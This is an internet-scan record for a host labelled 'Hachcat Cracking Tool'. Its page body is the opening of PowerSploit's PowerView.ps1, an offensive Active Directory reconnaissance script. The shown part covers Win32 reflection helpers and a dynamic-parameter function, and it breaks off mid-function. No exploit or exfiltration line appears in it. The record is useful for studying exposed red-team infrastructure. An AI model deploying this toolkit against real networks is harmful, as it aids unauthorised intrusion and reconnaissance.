{"hash": -770240523, "product": "Hachcat Cracking Tool", "http": {"status": 200, "robots_hash": null, "redirects": [], "securitytxt": null, "title": null, "sitemap_hash": null, "robots": null, "server": "Apache/2.4.58 (Amazon Linux)", "headers_hash": -1900477081, "host": "3.93.178.75", "html": "#requires -version 2\n\n<#\n\nPowerSploit File: PowerView.ps1\nAuthor: Will Schroeder (@harmj0y)\nLicense: BSD 3-Clause\nRequired Dependencies: None\n\n#>\n\n\n########################################################\n#\n# PSReflect code for Windows API access\n# Author: @mattifestation\n#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1\n#\n########################################################\n\nfunction New-InMemoryModule {\n<#\n.SYNOPSIS\n\nCreates an in-memory assembly and module\n\nAuthor: Matthew Graeber (@mattifestation)\nLicense: BSD 3-Clause\nRequired Dependencies: None\nOptional Dependencies: None\n\n.DESCRIPTION\n\nWhen defining custom enums, structs, and unmanaged functions, it is\nnecessary to associate to an assembly module. This helper function\ncreates an in-memory module that can be passed to the 'enum',\n'struct', and Add-Win32Type functions.\n\n.PARAMETER ModuleName\n\nSpecifies the desired name for the in-memory assembly and module. If\nModuleName is not provided, it will default to a GUID.\n\n.EXAMPLE\n\n$Module = New-InMemoryModule -ModuleName Win32\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]\n    [CmdletBinding()]\n    Param (\n        [Parameter(Position = 0)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ModuleName = [Guid]::NewGuid().ToString()\n    )\n\n    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())\n    $LoadedAssemblies = $AppDomain.GetAssemblies()\n\n    foreach ($Assembly in $LoadedAssemblies) {\n        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {\n            return $Assembly\n        }\n    }\n\n    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)\n    $Domain = $AppDomain\n    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')\n    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)\n\n    return $ModuleBuilder\n}\n\n\n# A helper function used to reduce typing while defining function\n# prototypes for Add-Win32Type.\nfunction func {\n    Param (\n        [Parameter(Position = 0, Mandatory = $True)]\n        [String]\n        $DllName,\n\n        [Parameter(Position = 1, Mandatory = $True)]\n        [string]\n        $FunctionName,\n\n        [Parameter(Position = 2, Mandatory = $True)]\n        [Type]\n        $ReturnType,\n\n        [Parameter(Position = 3)]\n        [Type[]]\n        $ParameterTypes,\n\n        [Parameter(Position = 4)]\n        [Runtime.InteropServices.CallingConvention]\n        $NativeCallingConvention,\n\n        [Parameter(Position = 5)]\n        [Runtime.InteropServices.CharSet]\n        $Charset,\n\n        [String]\n        $EntryPoint,\n\n        [Switch]\n        $SetLastError\n    )\n\n    $Properties = @{\n        DllName = $DllName\n        FunctionName = $FunctionName\n        ReturnType = $ReturnType\n    }\n\n    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }\n    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }\n    if ($Charset) { $Properties['Charset'] = $Charset }\n    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }\n    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }\n\n    New-Object PSObject -Property $Properties\n}\n\n\nfunction Add-Win32Type\n{\n<#\n.SYNOPSIS\n\nCreates a .NET type for an unmanaged Win32 function.\n\nAuthor: Matthew Graeber (@mattifestation)\nLicense: BSD 3-Clause\nRequired Dependencies: None\nOptional Dependencies: func\n\n.DESCRIPTION\n\nAdd-Win32Type enables you to easily interact with unmanaged (i.e.\nWin32 unmanaged) functions in PowerShell. After providing\nAdd-Win32Type with a function signature, a .NET type is created\nusing reflection (i.e. csc.exe is never called like with Add-Type).\n\nThe 'func' helper function can be used to reduce typing when defining\nmultiple function definitions.\n\n.PARAMETER DllName\n\nThe name of the DLL.\n\n.PARAMETER FunctionName\n\nThe name of the target function.\n\n.PARAMETER EntryPoint\n\nThe DLL export function name. This argument should be specified if the\nspecified function name is different than the name of the exported\nfunction.\n\n.PARAMETER ReturnType\n\nThe return type of the function.\n\n.PARAMETER ParameterTypes\n\nThe function parameters.\n\n.PARAMETER NativeCallingConvention\n\nSpecifies the native calling convention of the function. Defaults to\nstdcall.\n\n.PARAMETER Charset\n\nIf you need to explicitly call an 'A' or 'W' Win32 function, you can\nspecify the character set.\n\n.PARAMETER SetLastError\n\nIndicates whether the callee calls the SetLastError Win32 API\nfunction before returning from the attributed method.\n\n.PARAMETER Module\n\nThe in-memory module that will host the functions. Use\nNew-InMemoryModule to define an in-memory module.\n\n.PARAMETER Namespace\n\nAn optional namespace to prepend to the type. Add-Win32Type defaults\nto a namespace consisting only of the name of the DLL.\n\n.EXAMPLE\n\n$Mod = New-InMemoryModule -ModuleName Win32\n\n$FunctionDefinitions = @(\n  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),\n  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),\n  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())\n)\n\n$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'\n$Kernel32 = $Types['kernel32']\n$Ntdll = $Types['ntdll']\n$Ntdll::RtlGetCurrentPeb()\n$ntdllbase = $Kernel32::GetModuleHandle('ntdll')\n$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')\n\n.NOTES\n\nInspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189\n\nWhen defining multiple function prototypes, it is ideal to provide\nAdd-Win32Type with an array of function signatures. That way, they\nare all incorporated into the same in-memory module.\n#>\n\n    [OutputType([Hashtable])]\n    Param(\n        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]\n        [String]\n        $DllName,\n\n        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]\n        [String]\n        $FunctionName,\n\n        [Parameter(ValueFromPipelineByPropertyName=$True)]\n        [String]\n        $EntryPoint,\n\n        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]\n        [Type]\n        $ReturnType,\n\n        [Parameter(ValueFromPipelineByPropertyName=$True)]\n        [Type[]]\n        $ParameterTypes,\n\n        [Parameter(ValueFromPipelineByPropertyName=$True)]\n        [Runtime.InteropServices.CallingConvention]\n        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,\n\n        [Parameter(ValueFromPipelineByPropertyName=$True)]\n        [Runtime.InteropServices.CharSet]\n        $Charset = [Runtime.InteropServices.CharSet]::Auto,\n\n        [Parameter(ValueFromPipelineByPropertyName=$True)]\n        [Switch]\n        $SetLastError,\n\n        [Parameter(Mandatory=$True)]\n        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]\n        $Module,\n\n        [ValidateNotNull()]\n        [String]\n        $Namespace = ''\n    )\n\n    BEGIN\n    {\n        $TypeHash = @{}\n    }\n\n    PROCESS\n    {\n        if ($Module -is [Reflection.Assembly])\n        {\n            if ($Namespace)\n            {\n                $TypeHash[$DllName] = $Module.GetType(\"$Namespace.$DllName\")\n            }\n            else\n            {\n                $TypeHash[$DllName] = $Module.GetType($DllName)\n            }\n        }\n        else\n        {\n            # Define one type for each DLL\n            if (!$TypeHash.ContainsKey($DllName))\n            {\n                if ($Namespace)\n                {\n                    $TypeHash[$DllName] = $Module.DefineType(\"$Namespace.$DllName\", 'Public,BeforeFieldInit')\n                }\n                else\n                {\n                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')\n                }\n            }\n\n            $Method = $TypeHash[$DllName].DefineMethod(\n                $FunctionName,\n                'Public,Static,PinvokeImpl',\n                $ReturnType,\n                $ParameterTypes)\n\n            # Make each ByRef parameter an Out parameter\n            $i = 1\n            foreach($Parameter in $ParameterTypes)\n            {\n                if ($Parameter.IsByRef)\n                {\n                    [void] $Method.DefineParameter($i, 'Out', $null)\n                }\n\n                $i++\n            }\n\n            $DllImport = [Runtime.InteropServices.DllImportAttribute]\n            $SetLastErrorField = $DllImport.GetField('SetLastError')\n            $CallingConventionField = $DllImport.GetField('CallingConvention')\n            $CharsetField = $DllImport.GetField('CharSet')\n            $EntryPointField = $DllImport.GetField('EntryPoint')\n            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }\n\n            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }\n\n            # Equivalent to C# version of [DllImport(DllName)]\n            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])\n            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,\n                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),\n                [Reflection.FieldInfo[]] @($SetLastErrorField,\n                                           $CallingConventionField,\n                                           $CharsetField,\n                                           $EntryPointField),\n                [Object[]] @($SLEValue,\n                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),\n                             ([Runtime.InteropServices.CharSet] $Charset),\n                             $ExportedFuncName))\n\n            $Method.SetCustomAttribute($DllImportAttribute)\n        }\n    }\n\n    END\n    {\n        if ($Module -is [Reflection.Assembly])\n        {\n            return $TypeHash\n        }\n\n        $ReturnTypes = @{}\n\n        foreach ($Key in $TypeHash.Keys)\n        {\n            $Type = $TypeHash[$Key].CreateType()\n\n            $ReturnTypes[$Key] = $Type\n        }\n\n        return $ReturnTypes\n    }\n}\n\n\nfunction psenum {\n<#\n.SYNOPSIS\n\nCreates an in-memory enumeration for use in your PowerShell session.\n\nAuthor: Matthew Graeber (@mattifestation)\nLicense: BSD 3-Clause\nRequired Dependencies: None\nOptional Dependencies: None\n\n.DESCRIPTION\n\nThe 'psenum' function facilitates the creation of enums entirely in\nmemory using as close to a \"C style\" as PowerShell will allow.\n\n.PARAMETER Module\n\nThe in-memory module that will host the enum. Use\nNew-InMemoryModule to define an in-memory module.\n\n.PARAMETER FullName\n\nThe fully-qualified name of the enum.\n\n.PARAMETER Type\n\nThe type of each enum element.\n\n.PARAMETER EnumElements\n\nA hashtable of enum elements.\n\n.PARAMETER Bitfield\n\nSpecifies that the enum should be treated as a bitfield.\n\n.EXAMPLE\n\n$Mod = New-InMemoryModule -ModuleName Win32\n\n$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{\n    UNKNOWN =                  0\n    NATIVE =                   1 # Image doesn't require a subsystem.\n    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.\n    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.\n    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.\n    POSIX_CUI =                7 # Image runs in the Posix character subsystem.\n    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.\n    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.\n    EFI_APPLICATION =          10\n    EFI_BOOT_SERVICE_DRIVER =  11\n    EFI_RUNTIME_DRIVER =       12\n    EFI_ROM =                  13\n    XBOX =                     14\n    WINDOWS_BOOT_APPLICATION = 16\n}\n\n.NOTES\n\nPowerShell purists may disagree with the naming of this function but\nagain, this was developed in such a way so as to emulate a \"C style\"\ndefinition as closely as possible. Sorry, I'm not going to name it\nNew-Enum. :P\n#>\n\n    [OutputType([Type])]\n    Param (\n        [Parameter(Position = 0, Mandatory=$True)]\n        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]\n        $Module,\n\n        [Parameter(Position = 1, Mandatory=$True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $FullName,\n\n        [Parameter(Position = 2, Mandatory=$True)]\n        [Type]\n        $Type,\n\n        [Parameter(Position = 3, Mandatory=$True)]\n        [ValidateNotNullOrEmpty()]\n        [Hashtable]\n        $EnumElements,\n\n        [Switch]\n        $Bitfield\n    )\n\n    if ($Module -is [Reflection.Assembly])\n    {\n        return ($Module.GetType($FullName))\n    }\n\n    $EnumType = $Type -as [Type]\n\n    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)\n\n    if ($Bitfield)\n    {\n        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())\n        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())\n        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)\n    }\n\n    foreach ($Key in $EnumElements.Keys)\n    {\n        # Apply the specified enum type to each element\n        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)\n    }\n\n    $EnumBuilder.CreateType()\n}\n\n\n# A helper function used to reduce typing while defining struct\n# fields.\nfunction field {\n    Param (\n        [Parameter(Position = 0, Mandatory=$True)]\n        [UInt16]\n        $Position,\n\n        [Parameter(Position = 1, Mandatory=$True)]\n        [Type]\n        $Type,\n\n        [Parameter(Position = 2)]\n        [UInt16]\n        $Offset,\n\n        [Object[]]\n        $MarshalAs\n    )\n\n    @{\n        Position = $Position\n        Type = $Type -as [Type]\n        Offset = $Offset\n        MarshalAs = $MarshalAs\n    }\n}\n\n\nfunction struct\n{\n<#\n.SYNOPSIS\n\nCreates an in-memory struct for use in your PowerShell session.\n\nAuthor: Matthew Graeber (@mattifestation)\nLicense: BSD 3-Clause\nRequired Dependencies: None\nOptional Dependencies: field\n\n.DESCRIPTION\n\nThe 'struct' function facilitates the creation of structs entirely in\nmemory using as close to a \"C style\" as PowerShell will allow. Struct\nfields are specified using a hashtable where each field of the struct\nis comprosed of the order in which it should be defined, its .NET\ntype, and optionally, its offset and special marshaling attributes.\n\nOne of the features of 'struct' is that after your struct is defined,\nit will come with a built-in GetSize method as well as an explicit\nconverter so that you can easily cast an IntPtr to the struct without\nrelying upon calling SizeOf and/or PtrToStructure in the Marshal\nclass.\n\n.PARAMETER Module\n\nThe in-memory module that will host the struct. Use\nNew-InMemoryModule to define an in-memory module.\n\n.PARAMETER FullName\n\nThe fully-qualified name of the struct.\n\n.PARAMETER StructFields\n\nA hashtable of fields. Use the 'field' helper function to ease\ndefining each field.\n\n.PARAMETER PackingSize\n\nSpecifies the memory alignment of fields.\n\n.PARAMETER ExplicitLayout\n\nIndicates that an explicit offset for each field will be specified.\n\n.EXAMPLE\n\n$Mod = New-InMemoryModule -ModuleName Win32\n\n$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{\n    DOS_SIGNATURE =    0x5A4D\n    OS2_SIGNATURE =    0x454E\n    OS2_SIGNATURE_LE = 0x454C\n    VXD_SIGNATURE =    0x454C\n}\n\n$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{\n    e_magic =    field 0 $ImageDosSignature\n    e_cblp =     field 1 UInt16\n    e_cp =       field 2 UInt16\n    e_crlc =     field 3 UInt16\n    e_cparhdr =  field 4 UInt16\n    e_minalloc = field 5 UInt16\n    e_maxalloc = field 6 UInt16\n    e_ss =       field 7 UInt16\n    e_sp =       field 8 UInt16\n    e_csum =     field 9 UInt16\n    e_ip =       field 10 UInt16\n    e_cs =       field 11 UInt16\n    e_lfarlc =   field 12 UInt16\n    e_ovno =     field 13 UInt16\n    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)\n    e_oemid =    field 15 UInt16\n    e_oeminfo =  field 16 UInt16\n    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)\n    e_lfanew =   field 18 Int32\n}\n\n# Example of using an explicit layout in order to create a union.\n$TestUnion = struct $Mod TestUnion @{\n    field1 = field 0 UInt32 0\n    field2 = field 1 IntPtr 0\n} -ExplicitLayout\n\n.NOTES\n\nPowerShell purists may disagree with the naming of this function but\nagain, this was developed in such a way so as to emulate a \"C style\"\ndefinition as closely as possible. Sorry, I'm not going to name it\nNew-Struct. :P\n#>\n\n    [OutputType([Type])]\n    Param (\n        [Parameter(Position = 1, Mandatory=$True)]\n        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]\n        $Module,\n\n        [Parameter(Position = 2, Mandatory=$True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $FullName,\n\n        [Parameter(Position = 3, Mandatory=$True)]\n        [ValidateNotNullOrEmpty()]\n        [Hashtable]\n        $StructFields,\n\n        [Reflection.Emit.PackingSize]\n        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,\n\n        [Switch]\n        $ExplicitLayout\n    )\n\n    if ($Module -is [Reflection.Assembly])\n    {\n        return ($Module.GetType($FullName))\n    }\n\n    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,\n        Class,\n        Public,\n        Sealed,\n        BeforeFieldInit'\n\n    if ($ExplicitLayout)\n    {\n        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout\n    }\n    else\n    {\n        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout\n    }\n\n    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)\n    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]\n    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))\n\n    $Fields = New-Object Hashtable[]($StructFields.Count)\n\n    # Sort each field according to the orders specified\n    # Unfortunately, PSv2 doesn't have the luxury of the\n    # hashtable [Ordered] accelerator.\n    foreach ($Field in $StructFields.Keys)\n    {\n        $Index = $StructFields[$Field]['Position']\n        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}\n    }\n\n    foreach ($Field in $Fields)\n    {\n        $FieldName = $Field['FieldName']\n        $FieldProp = $Field['Properties']\n\n        $Offset = $FieldProp['Offset']\n        $Type = $FieldProp['Type']\n        $MarshalAs = $FieldProp['MarshalAs']\n\n        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')\n\n        if ($MarshalAs)\n        {\n            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])\n            if ($MarshalAs[1])\n            {\n                $Size = $MarshalAs[1]\n                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,\n                    $UnmanagedType, $SizeConst, @($Size))\n            }\n            else\n            {\n                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))\n            }\n\n            $NewField.SetCustomAttribute($AttribBuilder)\n        }\n\n        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }\n    }\n\n    # Make the struct aware of its own size.\n    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!\n    $SizeMethod = $StructBuilder.DefineMethod('GetSize',\n        'Public, Static',\n        [Int],\n        [Type[]] @())\n    $ILGenerator = $SizeMethod.GetILGenerator()\n    # Thanks for the help, Jason Shirk!\n    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)\n    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,\n        [Type].GetMethod('GetTypeFromHandle'))\n    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,\n        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))\n    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)\n\n    # Allow for explicit casting from an IntPtr\n    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!\n    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',\n        'PrivateScope, Public, Static, HideBySig, SpecialName',\n        $StructBuilder,\n        [Type[]] @([IntPtr]))\n    $ILGenerator2 = $ImplicitConverter.GetILGenerator()\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,\n        [Type].GetMethod('GetTypeFromHandle'))\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,\n        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)\n    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)\n\n    $StructBuilder.CreateType()\n}\n\n\n########################################################\n#\n# Misc. helpers\n#\n########################################################\n\nFunction New-DynamicParameter {\n<#\n.SYNOPSIS\n\nHelper function to simplify creating dynamic parameters.\n\n    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.\n    Originally released under the Microsoft Public License (Ms-PL).\n\n.DESCRIPTION\n\nHelper function to simplify creating dynamic parameters.\n\nExample use cases:\n    Include parameters only if your environment dictates it\n    Include parameters depending on the value of a user-specified parameter\n    Provide tab completion and intellisense for parameters, depending on the environment\n\nPlease keep in mind that all dynamic parameters you create, will not have corresponding variables created.\n    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,\n    ('Process' for advanced functions) to create those variables.\n    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.\n\nThis function has two operating modes:\n\n1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,\nwith one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.\n\n2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.\nThen you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,\nwith custom conditions and so on.\n\n.NOTES\n\nCredits to jrich523 and ramblingcookiemonster for their initial code and inspiration:\n    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1\n    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/\n    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/\n\nCredit to BM for alias and type parameters and their handling\n\n.PARAMETER Name\n\nName of the dynamic parameter\n\n.PARAMETER Type\n\nType for the dynamic parameter.  Default is string\n\n.PARAMETER Alias\n\nIf specified, one or more aliases to assign to the dynamic parameter\n\n.PARAMETER Mandatory\n\nIf specified, set the Mandatory attribute for this dynamic parameter\n\n.PARAMETER Position\n\nIf specified, set the Position attribute for this dynamic parameter\n\n.PARAMETER HelpMessage\n\nIf specified, set the HelpMessage for this dynamic parameter\n\n.PARAMETER DontShow\n\nIf specified, set the DontShow for this dynamic parameter.\nThis is the new PowerShell 4.0 attribute that hides parameter from tab-completion.\nhttp://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/\n\n.PARAMETER ValueFromPipeline\n\nIf specified, set the ValueFromPipeline attribute for this dynamic parameter\n\n.PARAMETER ValueFromPipelineByPropertyName\n\nIf specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter\n\n.PARAMETER ValueFromRemainingArguments\n\nIf specified, set the ValueFromRemainingArguments attribute for this dynamic parameter\n\n.PARAMETER ParameterSetName\n\nIf specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.\n\n.PARAMETER AllowNull\n\nIf specified, set the AllowNull attribute of this dynamic parameter\n\n.PARAMETER AllowEmptyString\n\nIf specified, set the AllowEmptyString attribute of this dynamic parameter\n\n.PARAMETER AllowEmptyCollection\n\nIf specified, set the AllowEmptyCollection attribute of this dynamic parameter\n\n.PARAMETER ValidateNotNull\n\nIf specified, set the ValidateNotNull attribute of this dynamic parameter\n\n.PARAMETER ValidateNotNullOrEmpty\n\nIf specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter\n\n.PARAMETER ValidateRange\n\nIf specified, set the ValidateRange attribute of this dynamic parameter\n\n.PARAMETER ValidateLength\n\nIf specified, set the ValidateLength attribute of this dynamic parameter\n\n.PARAMETER ValidatePattern\n\nIf specified, set the ValidatePattern attribute of this dynamic parameter\n\n.PARAMETER ValidateScript\n\nIf specified, set the ValidateScript attribute of this dynamic parameter\n\n.PARAMETER ValidateSet\n\nIf specified, set the ValidateSet attribute of this dynamic parameter\n\n.PARAMETER Dictionary\n\nIf specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.\nAppropriate for custom dynamic parameters creation.\n\nIf not specified, create and return a RuntimeDefinedParameterDictionary\nAppropriate for a simple dynamic parameter creation.\n#>\n\n    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]\n    Param (\n        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateNotNullOrEmpty()]\n        [string]$Name,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [System.Type]$Type = [int],\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [string[]]$Alias,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$Mandatory,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [int]$Position,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [string]$HelpMessage,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$DontShow,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$ValueFromPipeline,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$ValueFromPipelineByPropertyName,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$ValueFromRemainingArguments,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [string]$ParameterSetName = '__AllParameterSets',\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$AllowNull,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$AllowEmptyString,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$AllowEmptyCollection,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$ValidateNotNull,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [switch]$ValidateNotNullOrEmpty,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateCount(2,2)]\n        [int[]]$ValidateCount,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateCount(2,2)]\n        [int[]]$ValidateRange,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateCount(2,2)]\n        [int[]]$ValidateLength,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateNotNullOrEmpty()]\n        [string]$ValidatePattern,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateNotNullOrEmpty()]\n        [scriptblock]$ValidateScript,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateNotNullOrEmpty()]\n        [string[]]$ValidateSet,\n\n        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]\n        [ValidateNotNullOrEmpty()]\n        [ValidateScript({\n            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))\n            {\n                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'\n            }\n            $true\n        })]\n        $Dictionary = $false,\n\n        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]\n        [switch]$CreateVariables,\n\n        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]\n        [ValidateNotNullOrEmpty()]\n        [ValidateScript({\n            # System.Management.Automation.PSBoundParametersDictionary is an internal sealed class,\n            # so one can't use PowerShell's '-is' operator to validate type.\n            if($_.GetType().Name -notmatch 'Dictionary') {\n                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'\n            }\n            $true\n        })]\n        $BoundParameters\n    )\n\n    Begin {\n        $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary\n        function _temp { [CmdletBinding()] Param() }\n        $CommonParameters = (Get-Command _temp).Parameters.Keys\n    }\n\n    Process {\n        if($CreateVariables) {\n            $BoundKeys = $BoundParameters.Keys | Where-Object { $CommonParameters -notcontains $_ }\n            ForEach($Parameter in $BoundKeys) {\n                if ($Parameter) {\n                    Set-Variable -Name $Parameter -Value $BoundParameters.$Parameter -Scope 1 -Force\n                }\n            }\n        }\n        else {\n            $StaleKeys = @()\n            $StaleKeys = $PSBoundParameters.GetEnumerator() |\n                        ForEach-Object {\n                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {\n                                # If object has Equals, compare bound key and variable using it\n                                if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {\n                                    $_.Key\n                                }\n                            }\n                            else {\n                                # If object doesn't has Equals (e.g. 